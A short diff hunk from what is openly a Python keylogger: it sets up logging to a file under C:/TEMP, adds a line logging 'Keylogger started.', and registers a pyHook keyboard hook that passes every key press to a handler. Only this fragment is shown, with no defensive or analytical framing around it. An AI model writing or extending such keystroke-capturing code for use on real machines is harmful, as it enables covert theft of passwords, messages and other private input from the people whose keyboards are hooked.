@@ -39,6 +39,7 @@ if buffered:
     chrbuf = ""
 
 logging.basicConfig(filename='C:/TEMP/log.log', format='%(message)s')
+logging.warning("Keylogger started.")
 
 hm = pyHook.HookManager()
 hm.KeyDown = OnKeyboardEvent
